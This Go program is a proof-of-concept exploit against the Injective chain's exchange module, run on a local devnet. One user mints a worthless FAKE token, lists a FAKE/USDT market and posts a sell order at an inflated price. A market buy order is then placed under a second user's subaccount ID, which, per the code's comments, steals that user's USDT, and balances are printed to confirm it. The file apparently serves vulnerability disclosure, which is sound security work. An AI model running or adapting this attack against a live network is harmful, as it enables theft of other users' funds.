package main

import (
	"context"
	"fmt"
	"os"
	"time"

	"cosmossdk.io/math"
	codectypes "github.com/cosmos/cosmos-sdk/codec/types"
	"github.com/cosmos/cosmos-sdk/crypto/keyring"
	"github.com/cosmos/cosmos-sdk/types"
	sdk "github.com/cosmos/cosmos-sdk/types"
	txtypes "github.com/cosmos/cosmos-sdk/types/tx"
	"github.com/cosmos/cosmos-sdk/types/tx/signing"
	authsigning "github.com/cosmos/cosmos-sdk/x/auth/signing"
	authtypes "github.com/cosmos/cosmos-sdk/x/auth/types"
	banktypes "github.com/cosmos/cosmos-sdk/x/bank/types"
	govgeneraltypes "github.com/cosmos/cosmos-sdk/x/gov/types"
	govv1 "github.com/cosmos/cosmos-sdk/x/gov/types/v1"
	"github.com/ethereum/go-ethereum/common"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials/insecure"

	injcodectypes "github.com/InjectiveLabs/injective-core/injective-chain/codec/types"
	"github.com/InjectiveLabs/injective-core/injective-chain/crypto/hd"
	exchangetypes "github.com/InjectiveLabs/injective-core/injective-chain/modules/exchange/types/v2"
	tokenfactorytypes "github.com/InjectiveLabs/injective-core/injective-chain/modules/tokenfactory/types"
	injectivetypes "github.com/InjectiveLabs/injective-core/injective-chain/types"
)

const (
	chainID  = "injective-1"
	gasLimit = uint64(400000)
	gasPrice = "500000000inj"

	grpcEndpoint = "localhost:9900"
	homeDir      = "./.injectived"

	usdtDenom = "peggy0xdAC17F958D2ee523a2206206994597C13D831ec7"
)

var (
	encodingConfig injcodectypes.EncodingConfig
	devnetKeyring  keyring.Keyring
	genesisKeyInfo *keyring.Record
	user1KeyInfo   *keyring.Record
	user2KeyInfo   *keyring.Record
)

func init() {
	config := sdk.GetConfig()
	config.SetBech32PrefixForAccount("inj", "injpub")
	config.SetBech32PrefixForValidator("injvaloper", "injvaloperpub")
	config.SetBech32PrefixForConsensusNode("injvalcons", "injvalconspub")
	config.Seal()

	// Initialize encoding config
	encodingConfig = injcodectypes.MakeEncodingConfig()

	// Register account types
	authtypes.RegisterInterfaces(encodingConfig.InterfaceRegistry)
	injectivetypes.RegisterInterfaces(encodingConfig.InterfaceRegistry)

	// Register Injective's EthAccount type
	encodingConfig.InterfaceRegistry.RegisterImplementations((*sdk.AccountI)(nil), &injectivetypes.EthAccount{})
	encodingConfig.InterfaceRegistry.RegisterImplementations((*authtypes.GenesisAccount)(nil), &injectivetypes.EthAccount{})
}

func mustSeccuss(err error) {
	if err != nil {
		panic(err)
	}
}

func initKeyring() {
	var err error
	devnetKeyring, err = keyring.New(
		sdk.KeyringServiceName(),
		keyring.BackendFile,
		homeDir,
		os.Stdin,
		encodingConfig.Codec,
		hd.EthSecp256k1Option(),
	)
	mustSeccuss(err)

	fmt.Println("Please input the passphrase: 12345678")
	genesisKeyInfo, err = devnetKeyring.Key("genesis")
	mustSeccuss(err)

	user1KeyInfo, err = devnetKeyring.Key("user1")
	mustSeccuss(err)

	user2KeyInfo, err = devnetKeyring.Key("user2")
	mustSeccuss(err)
}

func getAccount(addr sdk.AccAddress) sdk.AccountI {
	conn, err := grpc.NewClient(grpcEndpoint, grpc.WithTransportCredentials(insecure.NewCredentials()))
	mustSeccuss(err)
	defer conn.Close()

	authClient := authtypes.NewQueryClient(conn)
	accResp, err := authClient.Account(context.Background(), &authtypes.QueryAccountRequest{
		Address: addr.String(),
	})
	mustSeccuss(err)

	var account sdk.AccountI
	err = encodingConfig.Codec.UnpackAny(accResp.Account, &account)
	mustSeccuss(err)

	return account
}

func signAndBroadcastTx(senderKeyInfo *keyring.Record, msgs ...sdk.Msg) *txtypes.BroadcastTxResponse {
	senderAddress, err := senderKeyInfo.GetAddress()
	mustSeccuss(err)

	txBuilder := encodingConfig.TxConfig.NewTxBuilder()
	err = txBuilder.SetMsgs(msgs...)
	mustSeccuss(err)

	feeAmount, err := sdk.ParseCoinsNormalized(gasPrice)
	mustSeccuss(err)
	txBuilder.SetFeeAmount(feeAmount)
	txBuilder.SetGasLimit(gasLimit)

	senderPubKey, err := senderKeyInfo.GetPubKey()
	mustSeccuss(err)

	senderAccount := getAccount(senderAddress)

	// Set empty signature
	sig := signing.SignatureV2{
		PubKey: senderPubKey,
		Data: &signing.SingleSignatureData{
			SignMode:  signing.SignMode_SIGN_MODE_DIRECT,
			Signature: nil,
		},
		Sequence: senderAccount.GetSequence(),
	}
	err = txBuilder.SetSignatures(sig)
	mustSeccuss(err)

	// Get bytes to sign
	bytesToSign, err := authsigning.GetSignBytesAdapter(
		context.Background(),
		encodingConfig.TxConfig.SignModeHandler(),
		signing.SignMode_SIGN_MODE_DIRECT,
		authsigning.SignerData{
			ChainID:       chainID,
			AccountNumber: senderAccount.GetAccountNumber(),
			Sequence:      senderAccount.GetSequence(),
		},
		txBuilder.GetTx(),
	)
	mustSeccuss(err)

	// Sign
	sigBytes, _, err := devnetKeyring.Sign(senderKeyInfo.Name, bytesToSign, signing.SignMode_SIGN_MODE_DIRECT)
	mustSeccuss(err)

	// Set actual signature
	sig = signing.SignatureV2{
		PubKey: senderPubKey,
		Data: &signing.SingleSignatureData{
			SignMode:  signing.SignMode_SIGN_MODE_DIRECT,
			Signature: sigBytes,
		},
		Sequence: senderAccount.GetSequence(),
	}
	err = txBuilder.SetSignatures(sig)
	mustSeccuss(err)

	// Encode and broadcast
	txBytes, err := encodingConfig.TxConfig.TxEncoder()(txBuilder.GetTx())
	mustSeccuss(err)

	conn, err := grpc.NewClient(grpcEndpoint, grpc.WithTransportCredentials(insecure.NewCredentials()))
	mustSeccuss(err)
	defer conn.Close()

	txClient := txtypes.NewServiceClient(conn)
	txResp, err := txClient.BroadcastTx(context.Background(), &txtypes.BroadcastTxRequest{
		TxBytes: txBytes,
		Mode:    txtypes.BroadcastMode_BROADCAST_MODE_SYNC,
	})
	mustSeccuss(err)

	fmt.Printf("Tx resp: %+v\n", txResp)
	return txResp
}

func waitTxConfirmation() {
	time.Sleep(3 * time.Second)
}

func getProposalIDFromTx(txHash string) uint64 {
	conn, err := grpc.NewClient(grpcEndpoint, grpc.WithTransportCredentials(insecure.NewCredentials()))
	mustSeccuss(err)
	defer conn.Close()

	txClient := txtypes.NewServiceClient(conn)

	// Query transaction
	txResp, err := txClient.GetTx(context.Background(), &txtypes.GetTxRequest{
		Hash: txHash,
	})
	mustSeccuss(err)

	// Extract proposal ID from events
	for _, event := range txResp.TxResponse.Events {
		if event.Type == "submit_proposal" {
			for _, attr := range event.Attributes {
				if attr.Key == "proposal_id" {
					proposalID := uint64(0)
					fmt.Sscanf(attr.Value, "%d", &proposalID)
					return proposalID
				}
			}
		}
	}

	panic("proposal_id not found in tx events")
}

func voteOnProposal(voterKeyInfo *keyring.Record, proposalID uint64, option govv1.VoteOption) {
	voterAddress, err := voterKeyInfo.GetAddress()
	mustSeccuss(err)

	msg := &govv1.MsgVote{
		ProposalId: proposalID,
		Voter:      voterAddress.String(),
		Option:     option,
		Metadata:   "",
	}

	signAndBroadcastTx(voterKeyInfo, msg)
}

func checkProposalStatus(proposalID uint64) {
	conn, err := grpc.NewClient(grpcEndpoint, grpc.WithTransportCredentials(insecure.NewCredentials()))
	mustSeccuss(err)
	defer conn.Close()

	govClient := govv1.NewQueryClient(conn)
	proposalResp, err := govClient.Proposal(context.Background(), &govv1.QueryProposalRequest{
		ProposalId: proposalID,
	})
	mustSeccuss(err)

	fmt.Printf("Proposal Status: %s, voting period: %s to %s\n", proposalResp.Proposal.Status.String(), proposalResp.Proposal.VotingStartTime.String(), proposalResp.Proposal.VotingEndTime.String())
}

func genesisSetUSDTMinNotional() {
	// 1. GenesisAddress create governance proposal
	genesisAddress, err := genesisKeyInfo.GetAddress()
	mustSeccuss(err)

	innerMsg := &exchangetypes.MsgBatchExchangeModification{
		Sender: authtypes.NewModuleAddress(govgeneraltypes.ModuleName).String(),
		Proposal: &exchangetypes.BatchExchangeModificationProposal{
			Title:       "Set USDT Min Notional",
			Description: "Set minimum notional value for USDT",
			DenomMinNotionalProposal: &exchangetypes.DenomMinNotionalProposal{
				Title:       "Set USDT Min Notional",
				Description: "Set minimum notional value for USDT",
				DenomMinNotionals: []*exchangetypes.DenomMinNotional{
					{
						Denom:       usdtDenom,
						MinNotional: math.LegacyMustNewDecFromStr("1"), // 1 USDT
					},
				},
			},
		},
	}

	innerMsgAny, _ := codectypes.NewAnyWithValue(innerMsg)
	msg := &govv1.MsgSubmitProposal{
		Messages:       []*codectypes.Any{innerMsgAny},
		InitialDeposit: sdk.NewCoins(sdk.NewCoin("inj", math.NewIntWithDecimal(1000, 18))),
		Proposer:       genesisAddress.String(),
		Metadata:       "",
		Title:          "Set USDT Min Notional",
		Summary:        "Set minimum notional value for USDT",
		Expedited:      false,
	}

	txResp := signAndBroadcastTx(genesisKeyInfo, msg)
	waitTxConfirmation()

	// 2. GenesisAddress vote on the proposal
	proposalID := getProposalIDFromTx(txResp.TxResponse.TxHash)
	voteOnProposal(genesisKeyInfo, proposalID, govv1.OptionYes)
	waitTxConfirmation()

	// 3. Wait for voting period to end
	checkProposalStatus(proposalID)
	fmt.Println("Waiting for voting period to end...")
	time.Sleep(12 * time.Second)

	// 4. Check final proposal status
	checkProposalStatus(proposalID)
}

func user1CreateFakeToken() {
	user1Address, err := user1KeyInfo.GetAddress()
	mustSeccuss(err)

	// Msg1: Create denom
	msgCreateDenom := tokenfactorytypes.NewMsgCreateDenom(
		user1Address.String(),
		"fake",      // subdenom
		"FakeToken", // name
		"FAKE",      // symbol
		18,          // decimals
		true,        // allowAdminBurn
	)

	// Msg2: Mint tokens (amount: 1,000,000,000 FAKE with 18 decimals)
	createdDenom := "factory/" + user1Address.String() + "/fake"
	mintAmount := sdk.NewCoin(createdDenom, math.NewIntWithDecimal(1000000000, 18))
	msgMint := tokenfactorytypes.NewMsgMint(
		user1Address.String(),
		mintAmount,
		"", // mint to sender
	)

	// Build and broadcast transaction
	signAndBroadcastTx(user1KeyInfo, msgCreateDenom, msgMint)
}

func user1CreateLaunchFakeTokenUSDTMarket() {
	user1Address, err := user1KeyInfo.GetAddress()
	mustSeccuss(err)

	fakeDenom := "factory/" + user1Address.String() + "/fake"

	msg := &exchangetypes.MsgInstantSpotMarketLaunch{
		Sender:              user1Address.String(),
		Ticker:              "FAKE/USDT",
		BaseDenom:           fakeDenom,
		QuoteDenom:          usdtDenom,
		MinPriceTickSize:    math.LegacyMustNewDecFromStr("1"),
		MinQuantityTickSize: math.LegacyMustNewDecFromStr("1"), // 1 FAKE
		BaseDecimals:        18,
		QuoteDecimals:       6,
		MinNotional:         math.LegacyMustNewDecFromStr("1"), // 1 USDT
	}

	signAndBroadcastTx(user1KeyInfo, msg)
}

func checkUSDTBalance() {
	user1Addr, err := user1KeyInfo.GetAddress()
	mustSeccuss(err)

	user2Addr, err := user2KeyInfo.GetAddress()
	mustSeccuss(err)

	conn, err := grpc.NewClient(grpcEndpoint, grpc.WithTransportCredentials(insecure.NewCredentials()))
	mustSeccuss(err)
	defer conn.Close()

	bankClient := banktypes.NewQueryClient(conn)

	for i, addr := range []types.AccAddress{user1Addr, user2Addr} {
		resp, err := bankClient.AllBalances(context.Background(), &banktypes.QueryAllBalancesRequest{Address: addr.String()})
		mustSeccuss(err)

		for _, coin := range resp.Balances {
			if coin.Denom == "peggy0xdAC17F958D2ee523a2206206994597C13D831ec7" {
				fmt.Printf("user%d USDT balance: %s\n", i+1, coin.Amount.String())
			}
		}
	}
}

func getMarketId(ticker string) string {
	conn, err := grpc.NewClient(grpcEndpoint, grpc.WithTransportCredentials(insecure.NewCredentials()))
	mustSeccuss(err)
	defer conn.Close()

	exchangeClient := exchangetypes.NewQueryClient(conn)

	// Query all spot markets
	marketsResp, err := exchangeClient.SpotMarkets(context.Background(), &exchangetypes.QuerySpotMarketsRequest{
		Status: "Active",
	})
	mustSeccuss(err)

	// Find market by ticker
	for _, market := range marketsResp.Markets {
		if market.Ticker == ticker {
			return market.MarketId
		}
	}

	panic(fmt.Sprintf("market with ticker %s not found", ticker))
}

func user1CreateLimitSellOrder(marketId string) {
	user1Address, err := user1KeyInfo.GetAddress()
	mustSeccuss(err)

	subaccountID := common.BytesToHash(common.RightPadBytes(user1Address.Bytes(), 32)).Hex()

	spotOrder := &exchangetypes.SpotOrder{
		MarketId: marketId,
		OrderInfo: exchangetypes.OrderInfo{
			SubaccountId: subaccountID,
			FeeRecipient: user1Address.String(),
			Price:        math.LegacyMustNewDecFromStr("10000"),
			Quantity:     math.LegacyMustNewDecFromStr("1000000000"), // 1,000,000,000 FAKE
		},
		OrderType: exchangetypes.OrderType_SELL,
	}

	msg := &exchangetypes.MsgBatchUpdateOrders{
		Sender:             user1Address.String(),
		SpotOrdersToCreate: []*exchangetypes.SpotOrder{spotOrder},
	}

	signAndBroadcastTx(user1KeyInfo, msg)
}

func user1CreateMarketBuyOrderOnBehalf(
	marketId string,
	onBehalfOf sdk.AccAddress,
) {
	user1Address, err := user1KeyInfo.GetAddress()
	mustSeccuss(err)

	onBehalfOfSubaccountID := common.BytesToHash(common.RightPadBytes(onBehalfOf.Bytes(), 32)).Hex()

	spotOrder := &exchangetypes.SpotOrder{
		MarketId: marketId,
		OrderInfo: exchangetypes.OrderInfo{
			SubaccountId: onBehalfOfSubaccountID, // <-- Use others subaccount ID
			FeeRecipient: user1Address.String(),
			Price:        math.LegacyMustNewDecFromStr("20000"),
			Quantity:     math.LegacyMustNewDecFromStr("1000000000"), // 1,000,000,000 FAKE
		},
		OrderType: exchangetypes.OrderType_BUY,
	}

	msg := &exchangetypes.MsgBatchUpdateOrders{
		Sender:                   user1Address.String(),
		SpotMarketOrdersToCreate: []*exchangetypes.SpotOrder{spotOrder},
	}

	signAndBroadcastTx(user1KeyInfo, msg)
}

func main() {
	initKeyring()

	// In the mainnet, USDT is the quote token,
	// so this step has already been performed in the mainnet.
	genesisSetUSDTMinNotional()
	waitTxConfirmation()

	// Step 1: User1 create FAKE token
	user1CreateFakeToken()
	waitTxConfirmation()

	// Step 2: User1 launch FAKE/USDT market
	user1CreateLaunchFakeTokenUSDTMarket()
	waitTxConfirmation()
	marketId := getMarketId("FAKE/USDT")

	// Check balance of USDT
	checkUSDTBalance()

	// Step 3: User1 create limit sell orders on FAKE/USDT market
	user1CreateLimitSellOrder(marketId)
	waitTxConfirmation()

	// Step 4: User1 steal USDT from the User2
	//         by create market buy orders on behalf of User2
	user2Address, err := user2KeyInfo.GetAddress()
	mustSeccuss(err)
	user1CreateMarketBuyOrderOnBehalf(marketId, user2Address)
	waitTxConfirmation()

	// Check balance of USDT
	checkUSDTBalance()
}
